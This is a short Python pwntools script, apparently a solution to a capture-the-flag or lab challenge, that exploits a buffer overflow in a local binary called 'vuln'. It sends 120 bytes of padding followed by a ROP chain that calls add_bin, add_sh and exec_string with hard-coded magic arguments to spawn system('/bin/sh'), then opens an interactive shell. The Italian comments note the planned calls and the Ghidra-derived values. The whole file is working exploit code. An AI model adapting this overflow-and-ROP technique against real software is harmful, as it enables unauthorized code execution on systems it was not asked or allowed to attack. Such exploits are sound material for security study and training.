import sys
from pwn import *
context(os='linux',arch='amd64')
p = process('./vuln')

#pattern create 500 e pattern search 
buf = b'\x55'*120


#devo chiamare add_bin, add_sh ed exec_string per eseguire system('/bin/sh')
add_bin_canary = 0xdeadbeef  # -0x21524111 con ghidra

add_sh_canary1 = 0xcafebabe # -0x35014542 con ghidra

add_sh_canary2 = 0x0badf00d # 0xbadf00d con ghidra


reference_to_binary = ELF('./vuln')
rop_chain = ROP(reference_to_binary)

rop_chain.call('add_bin', [add_bin_canary])

rop_chain.call('add_sh', [add_sh_canary1, add_sh_canary2])

rop_chain.call('exec_string')
print(rop_chain.chain())




p.sendline(buf+rop_chain.chain())

p.interactive()